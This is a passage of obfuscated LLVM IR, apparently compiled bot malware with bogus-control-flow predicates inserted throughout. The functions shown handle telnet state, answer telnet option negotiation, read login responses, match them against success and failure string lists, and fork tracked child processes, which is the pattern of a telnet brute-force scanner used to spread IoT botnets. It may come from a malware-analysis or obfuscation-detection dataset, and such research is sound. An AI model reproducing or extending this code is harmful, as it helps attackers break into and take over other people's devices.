  %110 = load i32, i32* @y.38
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %108, label %117, label %134

; <label>:117:                                    ; preds = %originalBBpart24
  %118 = load i32, i32* @x.37
  %119 = load i32, i32* @y.38
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %117
  store i32 0, i32* %5, align 4
  %126 = load i32, i32* @x.37
  %127 = load i32, i32* @y.38
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %148

; <label>:134:                                    ; preds = %originalBBpart24
  br label %136

; <label>:135:                                    ; preds = %79
  store i32 0, i32* %5, align 4
  br label %148

; <label>:136:                                    ; preds = %134
  br label %138

; <label>:137:                                    ; preds = %originalBBpart2
  store i32 0, i32* %5, align 4
  br label %148

; <label>:138:                                    ; preds = %136
  br label %139

; <label>:139:                                    ; preds = %138, %37
  %140 = load i32, i32* %6, align 4
  %141 = call i32 (i32, i32, ...) @fcntl(i32 %140, i32 3, i8* null)
  %142 = sext i32 %141 to i64
  store i64 %142, i64* %15, align 8
  %143 = load i64, i64* %15, align 8
  %144 = and i64 %143, -2049
  store i64 %144, i64* %15, align 8
  %145 = load i32, i32* %6, align 4
  %146 = load i64, i64* %15, align 8
  %147 = call i32 (i32, i32, ...) @fcntl(i32 %145, i32 4, i64 %146)
  store i32 1, i32* %5, align 4
  br label %148

; <label>:148:                                    ; preds = %139, %137, %135, %originalBBpart28, %36
  %149 = load i32, i32* @x.37
  %150 = load i32, i32* @y.38
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %148
  %157 = load i32, i32* %5, align 4
  %158 = load i32, i32* @x.37
  %159 = load i32, i32* @y.38
  %160 = sub i32 %158, 1
  %161 = mul i32 %158, %160
  %162 = urem i32 %161, 2
  %163 = icmp eq i32 %162, 0
  %164 = icmp slt i32 %159, 10
  %165 = or i1 %163, %164
  br i1 %165, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  ret i32 %157

originalBBalteredBB:                              ; preds = %originalBB, %45
  %166 = call i32* @__errno_location() #10
  %167 = load i32, i32* %166, align 4
  %168 = icmp eq i32 %167, 115
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %95
  store i32 4, i32* %13, align 4
  %169 = load i32, i32* %6, align 4
  %170 = bitcast i32* %14 to i8*
  %171 = call i32 @getsockopt(i32 %169, i32 1, i32 4, i8* %170, i32* %13) #3
  %172 = load i32, i32* %14, align 4
  %173 = icmp ne i32 %172, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %117
  store i32 0, i32* %5, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %148
  %174 = load i32, i32* %5, align 4
  br label %originalBB10
}

declare i32 @fcntl(i32, i32, ...) #2

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #6

declare i32 @connect(i32, %struct.sockaddr*, i32) #2

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #6

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #3
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %26

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* @x.39
  %10 = load i32, i32* @y.40
  %11 = sub i32 %9, 1
  %12 = mul i32 %9, %11
  %13 = urem i32 %12, 2
  %14 = icmp eq i32 %13, 0
  %15 = icmp slt i32 %10, 10
  %16 = or i1 %14, %15
  br i1 %16, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %8
  %17 = load i32, i32* %2, align 4
  store i32 %17, i32* %1, align 4
  %18 = load i32, i32* @x.39
  %19 = load i32, i32* @y.40
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %95

; <label>:26:                                     ; preds = %0
  %27 = load i64, i64* @numpids, align 8
  %28 = add i64 %27, 1
  store i64 %28, i64* @numpids, align 8
  %29 = load i64, i64* @numpids, align 8
  %30 = add i64 %29, 1
  %31 = mul i64 %30, 4
  %32 = call noalias i8* @malloc(i64 %31) #3
  %33 = bitcast i8* %32 to i32*
  store i32* %33, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %34

; <label>:34:                                     ; preds = %originalBBpart212, %26
  %35 = load i32, i32* %4, align 4
  %36 = zext i32 %35 to i64
  %37 = load i64, i64* @numpids, align 8
  %38 = sub i64 %37, 1
  %39 = icmp ult i64 %36, %38
  br i1 %39, label %40, label %85

; <label>:40:                                     ; preds = %34
  %41 = load i32, i32* @x.39
  %42 = load i32, i32* @y.40
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %40
  %49 = load i32*, i32** @pids, align 8
  %50 = load i32, i32* %4, align 4
  %51 = zext i32 %50 to i64
  %52 = getelementptr inbounds i32, i32* %49, i64 %51
  %53 = load i32, i32* %52, align 4
  %54 = load i32*, i32** %3, align 8
  %55 = load i32, i32* %4, align 4
  %56 = zext i32 %55 to i64
  %57 = getelementptr inbounds i32, i32* %54, i64 %56
  store i32 %53, i32* %57, align 4
  %58 = load i32, i32* @x.39
  %59 = load i32, i32* @y.40
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %66

; <label>:66:                                     ; preds = %originalBBpart24
  %67 = load i32, i32* @x.39
  %68 = load i32, i32* @y.40
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %66
  %75 = load i32, i32* %4, align 4
  %76 = add i32 %75, 1
  store i32 %76, i32* %4, align 4
  %77 = load i32, i32* @x.39
  %78 = load i32, i32* @y.40
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart212, label %originalBB6alteredBB

originalBBpart212:                                ; preds = %originalBB6
  br label %34

; <label>:85:                                     ; preds = %34
  %86 = load i32, i32* %2, align 4
  %87 = load i32*, i32** %3, align 8
  %88 = load i64, i64* @numpids, align 8
  %89 = sub i64 %88, 1
  %90 = getelementptr inbounds i32, i32* %87, i64 %89
  store i32 %86, i32* %90, align 4
  %91 = load i32*, i32** @pids, align 8
  %92 = bitcast i32* %91 to i8*
  call void @free(i8* %92) #3
  %93 = load i32*, i32** %3, align 8
  store i32* %93, i32** @pids, align 8
  %94 = load i32, i32* %2, align 4
  store i32 %94, i32* %1, align 4
  br label %95

; <label>:95:                                     ; preds = %85, %originalBBpart2
  %96 = load i32, i32* %1, align 4
  ret i32 %96

originalBBalteredBB:                              ; preds = %originalBB, %8
  %97 = load i32, i32* %2, align 4
  store i32 %97, i32* %1, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %40
  %98 = load i32*, i32** @pids, align 8
  %99 = load i32, i32* %4, align 4
  %100 = zext i32 %99 to i64
  %101 = getelementptr inbounds i32, i32* %98, i64 %100
  %102 = load i32, i32* %101, align 4
  %103 = load i32*, i32** %3, align 8
  %104 = load i32, i32* %4, align 4
  %105 = zext i32 %104 to i64
  %106 = getelementptr inbounds i32, i32* %103, i64 %105
  store i32 %102, i32* %106, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %66
  %107 = load i32, i32* %4, align 4
  %_ = shl i32 %107, 1
  %_7 = sub i32 0, %107
  %gen = add i32 %_7, 1
  %_8 = shl i32 %107, 1
  %_9 = sub i32 0, %107
  %gen10 = add i32 %_9, 1
  %108 = add i32 %107, 1
  store i32 %108, i32* %4, align 4
  br label %originalBB6
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  %3 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 1
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  store i32 %6, i32* %7, align 4
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = call i8* @inet_ntoa(i32 %9) #3
  ret i8* %10
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8**) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i32 %1, i32* %8, align 4
  store i8* %2, i8** %9, align 8
  store i32 %3, i32* %10, align 4
  store i8** %4, i8*** %11, align 8
  %14 = load i8*, i8** %9, align 8
  %15 = load i32, i32* %10, align 4
  %16 = sext i32 %15 to i64
  call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 %16, i32 1, i1 false)
  %17 = load i32, i32* %7, align 4
  %18 = load i32, i32* %8, align 4
  %19 = load i8*, i8** %9, align 8
  %20 = load i32, i32* %10, align 4
  %21 = call i32 @read_with_timeout(i32 %17, i32 %18, i8* %19, i32 %20)
  store i32 %21, i32* %12, align 4
  %22 = load i8*, i8** %9, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 0
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  %26 = icmp eq i32 %25, 255
  br i1 %26, label %27, label %31

; <label>:27:                                     ; preds = %5
  %28 = load i32, i32* %7, align 4
  %29 = load i8*, i8** %9, align 8
  %30 = call i32 @negotiate(i32 %28, i8* %29, i32 3)
  br label %31

; <label>:31:                                     ; preds = %27, %5
  %32 = load i8*, i8** %9, align 8
  %33 = load i8**, i8*** %11, align 8
  %34 = call i32 @contains_string(i8* %32, i8** %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %31
  store i32 1, i32* %6, align 4
  br label %38

; <label>:37:                                     ; preds = %31
  store i32 0, i32* %6, align 4
  br label %38

; <label>:38:                                     ; preds = %37, %36
  %39 = load i32, i32* %6, align 4
  ret i32 %39
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca %struct.fd_set, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 0, i64* %14, align 8
  %15 = load i32, i32* %7, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 %16, i64* %17, align 8
  br label %18

; <label>:18:                                     ; preds = %4
  %19 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %20 = getelementptr inbounds [16 x i64], [16 x i64]* %19, i64 0, i64 0
  %21 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %20) #3, !srcloc !4
  %22 = extractvalue { i64, i64* } %21, 0
  %23 = extractvalue { i64, i64* } %21, 1
  %24 = trunc i64 %22 to i32
  store i32 %24, i32* %12, align 4
  %25 = ptrtoint i64* %23 to i64
  %26 = trunc i64 %25 to i32
  store i32 %26, i32* %13, align 4
  br label %27

; <label>:27:                                     ; preds = %18
  %28 = load i32, i32* %6, align 4
  %29 = srem i32 %28, 64
  %30 = zext i32 %29 to i64
  %31 = shl i64 1, %30
  %32 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %33 = load i32, i32* %6, align 4
  %34 = sdiv i32 %33, 64
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [16 x i64], [16 x i64]* %32, i64 0, i64 %35
  %37 = load i64, i64* %36, align 8
  %38 = or i64 %37, %31
  store i64 %38, i64* %36, align 8
  %39 = load i32, i32* %6, align 4
  %40 = add nsw i32 %39, 1
  %41 = call i32 @select(i32 %40, %struct.fd_set* %10, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* %11)
  %42 = icmp slt i32 %41, 1
  br i1 %42, label %43, label %44

; <label>:43:                                     ; preds = %27
  store i32 0, i32* %5, align 4
  br label %51

; <label>:44:                                     ; preds = %27
  %45 = load i32, i32* %6, align 4
  %46 = load i8*, i8** %8, align 8
  %47 = load i32, i32* %9, align 4
  %48 = sext i32 %47 to i64
  %49 = call i64 @recv(i32 %45, i8* %46, i64 %48, i32 0)
  %50 = trunc i64 %49 to i32
  store i32 %50, i32* %5, align 4
  br label %51

; <label>:51:                                     ; preds = %44, %43
  %52 = load i32, i32* @x.45
  %53 = load i32, i32* @y.46
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %51
  %60 = load i32, i32* %5, align 4
  %61 = load i32, i32* @x.45
  %62 = load i32, i32* @y.46
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %60

originalBBalteredBB:                              ; preds = %originalBB, %51
  %69 = load i32, i32* %5, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @advance_state(%struct.telstate_t*, i32) #0 {
  %3 = load i32, i32* @x.47
  %4 = load i32, i32* @y.48
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca %struct.telstate_t*, align 8
  %12 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %11, align 8
  store i32 %1, i32* %12, align 4
  %13 = load i32, i32* %12, align 4
  %14 = icmp eq i32 %13, 0
  %15 = load i32, i32* @x.47
  %16 = load i32, i32* @y.48
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %14, label %23, label %28

; <label>:23:                                     ; preds = %originalBBpart2
  %24 = load %struct.telstate_t*, %struct.telstate_t** %11, align 8
  %25 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i32 0, i32 0
  %26 = load i32, i32* %25, align 8
  %27 = call i32 @close(i32 %26)
  br label %28

; <label>:28:                                     ; preds = %23, %originalBBpart2
  %29 = load %struct.telstate_t*, %struct.telstate_t** %11, align 8
  %30 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %29, i32 0, i32 7
  store i32 0, i32* %30, align 8
  %31 = load i32, i32* %12, align 4
  %32 = trunc i32 %31 to i8
  %33 = load %struct.telstate_t*, %struct.telstate_t** %11, align 8
  %34 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i32 0, i32 2
  store i8 %32, i8* %34, align 8
  %35 = load %struct.telstate_t*, %struct.telstate_t** %11, align 8
  %36 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i32 0, i32 9
  %37 = load i8*, i8** %36, align 8
  call void @llvm.memset.p0i8.i64(i8* %37, i8 0, i64 1024, i32 1, i1 false)
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %38 = alloca %struct.telstate_t*, align 8
  %39 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %38, align 8
  store i32 %1, i32* %39, align 4
  %40 = load i32, i32* %39, align 4
  %41 = icmp eq i32 %40, 0
  br label %originalBB
}

declare i32 @close(i32) #2

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %3 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  call void @advance_state(%struct.telstate_t* %3, i32 0)
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 3
  store i8 1, i8* %5, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([4 x i8*], [4 x i8*]* @successes, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) #0 {
  %2 = load i32, i32* @x.53
  %3 = load i32, i32* @y.54
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8*, align 8
  store i8* %0, i8** %10, align 8
  %11 = load i8*, i8** %10, align 8
  %12 = call i32 @contains_string(i8* %11, i8** getelementptr inbounds ([8 x i8*], [8 x i8*]* @fails, i32 0, i32 0))
  %13 = load i32, i32* @x.53
  %14 = load i32, i32* @y.54
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %12

originalBBalteredBB:                              ; preds = %originalBB, %1
  %21 = alloca i8*, align 8
  store i8* %0, i8** %21, align 8
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 @contains_string(i8* %22, i8** getelementptr inbounds ([8 x i8*], [8 x i8*]* @fails, i32 0, i32 0))
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_success(i8* %3)
  %5 = icmp ne i32 %4, 0
  br i1 %5, label %26, label %6

; <label>:6:                                      ; preds = %1
  %7 = load i32, i32* @x.55
  %8 = load i32, i32* @y.56
  %9 = sub i32 %7, 1
  %10 = mul i32 %7, %9
  %11 = urem i32 %10, 2
  %12 = icmp eq i32 %11, 0
  %13 = icmp slt i32 %8, 10
  %14 = or i1 %12, %13
  br i1 %14, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %6
  %15 = load i8*, i8** %2, align 8
  %16 = call i32 @contains_fail(i8* %15)
  %17 = icmp ne i32 %16, 0
  %18 = load i32, i32* @x.55
  %19 = load i32, i32* @y.56
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:26:                                     ; preds = %originalBBpart2, %1
  %27 = phi i1 [ true, %1 ], [ %17, %originalBBpart2 ]
  %28 = zext i1 %27 to i32
  ret i32 %28

originalBBalteredBB:                              ; preds = %originalBB, %6
  %29 = load i8*, i8** %2, align 8
  %30 = call i32 @contains_fail(i8* %29)
  %31 = icmp ne i32 %30, 0
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %8

; <label>:8:                                      ; preds = %16, %2
  %9 = load i8**, i8*** %5, align 8
  %10 = load i32, i32* %6, align 4
  %11 = add nsw i32 %10, 1
  store i32 %11, i32* %6, align 4
  %12 = sext i32 %11 to i64
  %13 = getelementptr inbounds i8*, i8** %9, i64 %12
  %14 = load i8*, i8** %13, align 8
  %15 = icmp ne i8* %14, null
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %8
  br label %8

; <label>:17:                                     ; preds = %8
  %18 = load i32, i32* @x.57
  %19 = load i32, i32* @y.58
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %17
  store i32 0, i32* %7, align 4
  %26 = load i32, i32* @x.57
  %27 = load i32, i32* @y.58
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %34

; <label>:34:                                     ; preds = %49, %originalBBpart2
  %35 = load i32, i32* %7, align 4
  %36 = load i32, i32* %6, align 4
  %37 = icmp slt i32 %35, %36
  br i1 %37, label %38, label %52

; <label>:38:                                     ; preds = %34
  %39 = load i8*, i8** %4, align 8
  %40 = load i8**, i8*** %5, align 8
  %41 = load i32, i32* %7, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds i8*, i8** %40, i64 %42
  %44 = load i8*, i8** %43, align 8
  %45 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %39, i8* %44)
  %46 = icmp ne i32 %45, 0
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %38
  store i32 1, i32* %3, align 4
  br label %69

; <label>:48:                                     ; preds = %38
  br label %49

; <label>:49:                                     ; preds = %48
  %50 = load i32, i32* %7, align 4
  %51 = add nsw i32 %50, 1
  store i32 %51, i32* %7, align 4
  br label %34

; <label>:52:                                     ; preds = %34
  %53 = load i32, i32* @x.57
  %54 = load i32, i32* @y.58
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %52
  store i32 0, i32* %3, align 4
  %61 = load i32, i32* @x.57
  %62 = load i32, i32* @y.58
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %69

; <label>:69:                                     ; preds = %originalBBpart24, %47
  %70 = load i32, i32* %3, align 4
  ret i32 %70

originalBBalteredBB:                              ; preds = %originalBB, %17
  store i32 0, i32* %7, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %52
  store i32 0, i32* %3, align 4
  br label %originalBB1
}

declare i32 @strcasestr(...) #2

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %109 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

; <label>:13:                                     ; preds = %3
  store i32 0, i32* %4, align 4
  br label %127

; <label>:14:                                     ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 %15, i8* %8, i64 1, i32 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %39

; <label>:22:                                     ; preds = %14
  %23 = load i32, i32* @x.59
  %24 = load i32, i32* @y.60
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %22
  store i8 -2, i8* %8, align 1
  %31 = load i32, i32* @x.59
  %32 = load i32, i32* @y.60
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %102

; <label>:39:                                     ; preds = %14
  %40 = load i8*, i8** %6, align 8
  %41 = getelementptr inbounds i8, i8* %40, i64 1
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 254, %43
  br i1 %44, label %45, label %62

; <label>:45:                                     ; preds = %39
  %46 = load i32, i32* @x.59
  %47 = load i32, i32* @y.60
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %45
  store i8 -4, i8* %8, align 1
  %54 = load i32, i32* @x.59
  %55 = load i32, i32* @y.60
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBBpart24, label %originalBB1alteredBB

